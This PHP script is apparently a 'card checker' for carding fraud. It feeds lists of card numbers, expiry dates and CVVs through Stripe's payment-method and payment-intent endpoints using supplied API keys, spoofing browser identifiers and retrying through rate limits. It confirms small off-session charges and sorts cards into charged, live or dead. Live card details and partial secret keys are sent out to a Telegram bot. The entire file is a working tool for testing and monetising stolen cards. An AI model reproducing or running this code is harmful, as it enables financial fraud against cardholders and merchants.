<?php

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
}

function sendTelegramMessage($botToken, $chatID, $message) {
    if (empty($botToken) || empty($chatID)) {
        return false;
    }
    
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $data = [
        'chat_id' => $chatID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    return $result;
}

function find_between($string, $start, $end) {
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(substr($string, $ini, $len));
}

// Get parameters
$sk_key = $_GET['sk_key'];
$pk_key = $_GET['pk_key'];
$sec = $_GET['sec'];
$amt = $_GET['cst'];
$telegram_bot_token = $_GET['telegram_bot_token'];
$telegram_chat_id = $_GET['telegram_chat_id'];

if(empty($amt)) {
    $amt = '1';
}
$chr = $amt * 100;

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ - Create Payment Method]--------------------#
$x = 0;  
$max_retries = 200;
$result1 = '';
$result2 = '';
$tok1 = '';
$payment_method_created = false;

// Generate random values like the Python script
$guid = bin2hex(random_bytes(16));
$muid = bin2hex(random_bytes(16));
$sid = bin2hex(random_bytes(16));
$time_on_page = rand(10021, 10090);

while(true) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Authorization: Bearer ' . $pk_key,
        'Content-Type: application/x-www-form-urlencoded',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    ));
    
    // Create payment method data similar to Python script
    $postData = http_build_query([
        'type' => 'card',
        'card[number]' => $cc,
        'card[exp_month]' => $mes,
        'card[exp_year]' => $ano,
        'card[cvc]' => $cvv,
        'guid' => $guid,
        'muid' => $muid,
        'sid' => $sid,
        'payment_user_agent' => 'stripe.js/fb7ba4c633; stripe-js-v3/fb7ba4c633; split-card-element',
        'time_on_page' => $time_on_page
    ]);
    
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    
    $result1 = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    
    // Debug: Log the result for troubleshooting
    error_log("Payment Method Response: " . $result1);
    error_log("HTTP Code: " . $httpcode);
    
    if (!empty($curl_error)) {
        error_log("cURL Error: " . $curl_error);
    }
    
    if (strpos($result1, "rate_limit")) {
        $x++;
        if ($x >= $max_retries) {
            $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
            $response = "Rate Limit Exceeded";
            $hits = "NO";
            curl_close($ch);
            break;
        }
        continue;
    }
    
    // Check if payment method was created successfully
    $tok1 = GetStr($result1, '"id": "', '"');
    if (!empty($tok1) && strpos($result1, '"object": "payment_method"') !== false) {
        $payment_method_created = true;
        error_log("Payment Method Created Successfully: " . $tok1);
    } else {
        // Get the actual error message from Stripe
        $error_msg = GetStr($result1, '"message": "', '"');
        if (!empty($error_msg)) {
            $response = $error_msg;
        } else {
            $response = "Payment Method Creation Failed - Unknown Error";
        }
        error_log("Payment Method Failed: " . $result1);
    }
    
    curl_close($ch);
    break;
}

// Only proceed to payment intent if payment method was created successfully
if ($payment_method_created && !empty($tok1)) {
    #-------------------[2nd REQ - Create Payment Intent]--------------------#
    $x = 0;

    while(true) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Authorization: Bearer ' . $sk_key,
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        ));
        
        $postData = http_build_query([
            'amount' => $chr,
            'currency' => 'usd',
            'payment_method_types[]' => 'card',
            'payment_method' => $tok1,
            'confirm' => 'true',
            'off_session' => 'true',
            'description' => 'Ghost Donation'
        ]);
        
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        
        $result2 = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        
        // Debug: Log the result for troubleshooting
        error_log("Payment Intent Response: " . $result2);
        error_log("Payment Intent HTTP Code: " . $httpcode);
        
        if (!empty($curl_error)) {
            error_log("Payment Intent cURL Error: " . $curl_error);
        }
        
        $tok2 = GetStr($result2,'"id": "','"');
        $receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
        
        if (strpos($result2, "rate_limit")) {
            $x++;
            if ($x >= $max_retries) {
                $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
                $response = "Rate Limit Exceeded";
                $hits = "NO";
                curl_close($ch);
                break;
            }
            continue;
        }
        curl_close($ch);
        break;
    }
} else {
    // Payment method creation failed - set status and response
    if (!isset($status)) {
        $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
        $hits = "NO";
        // Response is already set above with the actual error message
    }
}

//=================== [ RESPONSE HANDLING ] ===================//

$domain = $_SERVER['HTTP_HOST'];

// Telegram message function
function sendHitToTelegram($botToken, $chatID, $cc, $sk_key, $result_type, $amount, $domain, $response) {
    if (!empty($botToken) && !empty($chatID)) {
        $message = "💳 GENZ CHECKER HIT 💳\n";
        $message .= "➤ CC: " . $cc . "\n";
        $message .= "➤ SK Key: " . substr($sk_key, 0, 10) . "***\n";
        $message .= "➤ Result: " . $result_type . "\n";
        $message .= "➤ Response: " . $response . "\n";
        $message .= "➤ Amount: $" . $amount . "\n";
        $message .= "➤ Checked from: " . $domain . "\n";
        $message .= "➤ Time: " . date('Y-m-d H:i:s') . "\n";
        
        sendTelegramMessage($botToken, $chatID, $message);
    }
}

// Response handling based on Python script logic
if (isset($status)) {
    // Already set from rate limit or payment method failure
} elseif (empty($result2)) {
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "No response from server";
    $hits = "NO";
} elseif (strpos($result2, '"status": "succeeded"') !== false || 
          strpos($result2, 'succeeded') !== false ||
          strpos($result2, 'thank you') !== false ||
          strpos($result2, 'Thank you') !== false ||
          strpos($result2, 'Thank You') !== false ||
          strpos($result2, 'Thank You!') !== false ||
          strpos($result2, 'Thank you!') !== false ||
          strpos($result2, 'thank You!') !== false ||
          strpos($result2, 'thank you!') !== false ||
          strpos($result2, 'Thank you for your order') !== false ||
          strpos($result2, 'Thank You for your order') !== false ||
          strpos($result2, 'Thank You For Your Order') !== false ||
          strpos($result2, 'success:true') !== false) {
    
    $status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅";
    $response = "Charged ".$amt."$ 🔥";
    $hits = "CHARGED";
    sendHitToTelegram($telegram_bot_token, $telegram_chat_id, $lista, $sk_key, "CHARGED", $amt, $domain, $response);
    
} elseif (strpos($result2, "insufficient_funds") !== false || 
          strpos($result2, "card has insufficient funds") !== false) {
    
    $status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅";
    $response = "Insufficient Funds ❎";
    $hits = "LIVE";
    sendHitToTelegram($telegram_bot_token, $telegram_chat_id, $lista, $sk_key, "Insufficient Funds", $amt, $domain, $response);
    
} elseif (strpos($result2, "incorrect_cvc") !== false || 
          strpos($result1, "incorrect_cvc") !== false ||
          strpos($result2, "security code is incorrect") !== false ||
          strpos($result2, "Your card's security code is incorrect") !== false) {
    
    $status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅";
    $response = "CCN Live ❎";
    $hits = "LIVE";
    sendHitToTelegram($telegram_bot_token, $telegram_chat_id, $lista, $sk_key, "CCN Live", $amt, $domain, $response);
    
} elseif (strpos($result2, "transaction_not_allowed") !== false) {
    $status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅";
    $response = "Card Doesn't Support Purchase ❎";
    $hits = "LIVE";
    sendHitToTelegram($telegram_bot_token, $telegram_chat_id, $lista, $sk_key, "Transaction Not Allowed", $amt, $domain, $response);
    
} elseif (strpos($result2, '"cvc_check": "pass"') !== false) {
    $status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅";
    $response = "CVV LIVE ❎";
    $hits = "LIVE";
    sendHitToTelegram($telegram_bot_token, $telegram_chat_id, $lista, $sk_key, "CVV LIVE", $amt, $domain, $response);
    
} elseif (strpos($result2, "three_d_secure_redirect") !== false || 
          strpos($result2, "card_error_authentication_required") !== false) {
    
    $status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅";
    $response = "3D Challenge Required ❎";
    $hits = "LIVE";
    sendHitToTelegram($telegram_bot_token, $telegram_chat_id, $lista, $sk_key, "3D Challenge Required", $amt, $domain, $response);
    
} elseif (strpos($result2, "stripe_3ds2_fingerprint") !== false) {
    $status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅";
    $response = "3D Challenge Required ❎";
    $hits = "LIVE";
    sendHitToTelegram($telegram_bot_token, $telegram_chat_id, $lista, $sk_key, "3D Challenge Required", $amt, $domain, $response);
    
} elseif (strpos($result2, "Your card does not support this type of purchase") !== false) {
    $status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅";
    $response = "Card Doesn't Support Purchase ❎";
    $hits = "LIVE";
    sendHitToTelegram($telegram_bot_token, $telegram_chat_id, $lista, $sk_key, "Card Not Supported", $amt, $domain, $response);
    
} elseif (strpos($result2, "generic_decline") !== false || 
          strpos($result2, "You have exceeded the maximum number of declines on this card in the last 24 hour period") !== false ||
          strpos($result2, "card_decline_rate_limit_exceeded") !== false) {
    
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Generic Decline";
    $hits = "NO";
    
} elseif (strpos($result2, "do_not_honor") !== false) {
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Do Not Honor";
    $hits = "NO";
    
} elseif (strpos($result2, "fraudulent") !== false) {
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Fraudulent";
    $hits = "NO";
    
} elseif (strpos($result2, "setup_intent_authentication_failure") !== false) {
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "setup_intent_authentication_failure";
    $hits = "NO";
    
} elseif (strpos($result2, "invalid_cvc") !== false || 
          strpos($result1, "invalid_cvc") !== false) {
    
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "invalid_cvc";
    $hits = "NO";
    
} elseif (strpos($result2, "stolen_card") !== false) {
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Stolen Card";
    $hits = "NO";
    
} elseif (strpos($result2, "lost_card") !== false) {
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Lost Card";
    $hits = "NO";
    
} elseif (strpos($result2, "pickup_card") !== false) {
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Pickup Card";
    $hits = "NO";
    
} elseif (strpos($result2, "incorrect_number") !== false || 
          strpos($result1, "incorrect_number") !== false) {
    
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Incorrect Card Number";
    $hits = "NO";
    
} elseif (strpos($result2, "Your card has expired") !== false || 
          strpos($result2, "expired_card") !== false) {
    
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Expired Card";
    $hits = "NO";
    
} elseif (strpos($result2, "intent_confirmation_challenge") !== false) {
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "intent_confirmation_challenge";
    $hits = "NO";
    
} elseif (strpos($result2, "Your card number is incorrect") !== false) {
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Incorrect Card Number";
    $hits = "NO";
    
} elseif (strpos($result2, "This account isn't enabled to make cross border transactions") !== false) {
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Cross Border Transaction Not Allowed";
    $hits = "NO";
    
} elseif (strpos($result2, "Your card's expiration year is invalid") !== false) {
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Expiration Year Invalid";
    $hits = "NO";
    
} elseif (strpos($result2, "Your card's expiration month is invalid") !== false || 
          strpos($result2, "invalid_expiry_month") !== false) {
    
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Expiration Month Invalid";
    $hits = "NO";
    
} elseif (strpos($result2, "card is not supported") !== false) {
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Card Not Supported";
    $hits = "NO";
    
} elseif (strpos($result2, "invalid_account") !== false) {
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Dead Card";
    $hits = "NO";
    
} elseif (strpos($result2, "Invalid API Key provided") !== false || 
          strpos($result2, "testmode_charges_only") !== false ||
          strpos($result2, "api_key_expired") !== false ||
          strpos($result2, "Your account cannot currently make live charges") !== false ||
          strpos($result1, "Invalid API Key provided") !== false || 
          strpos($result1, "testmode_charges_only") !== false ||
          strpos($result1, "api_key_expired") !== false ||
          strpos($result1, "Your account cannot currently make live charges") !== false) {
    
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "stripe error . contact support@stripe.com for more details";
    $hits = "NO";
    
} elseif (strpos($result2, "Your card was declined") !== false || 
          strpos($result2, "card was declined") !== false) {
    
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $response = "Generic Decline";
    $hits = "NO";
    
} else {
    $status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌";
    $error_msg = find_between($result2, 'message": "', '"');
    if (empty($error_msg)) {
        $error_msg = "Card Declined";
    }
    $response = $error_msg;
    $hits = "NO";
}

//=================== [ OUTPUT ] ===================//

if ($hits == "CHARGED") {
    echo '<span class="badge badge-success"><b>#CHARGED</b></span> <font class="text-white"><b>'.$lista.'</b></font> <font class="text-white">
    <br>
    ➤ Response: '.$response.'
    <br>';
    if (!empty($receipturl)) {
        echo '➤ Receipt: <span style="color: green;" class="badge"><a href="' . $receipturl . '" target="_blank"><b>Here</b></a></span>
        <br>';
    }
    echo '➤ Checked from: <b>' . $domain . '</b></font><br>';
    
} elseif ($hits == "LIVE") {
    echo '<span class="badge badge-info">'.$status.'</span> <font class="text-white"><b>'.$lista.'</b></font> <font class="text-white">
    <br>
    ➤ Response: '.$response.'
    <br>
    ➤ Checked from: <b>' . $domain . '</b></font><br>';
    
} else {
    echo '<span class="badge badge-danger">'.$status.'</span> <font class="text-white"><b>'.$lista.'</b></font> <font class="text-white">
    <br>
    ➤ Response: '.$response.'
    <br>
    ➤ Checked from: <b>' . $domain . '</b></font><br>';
}

// Debug output - you can remove this in production
error_log("Final Status: " . $status . " | Response: " . $response . " | Hits: " . $hits);

ob_flush();
?>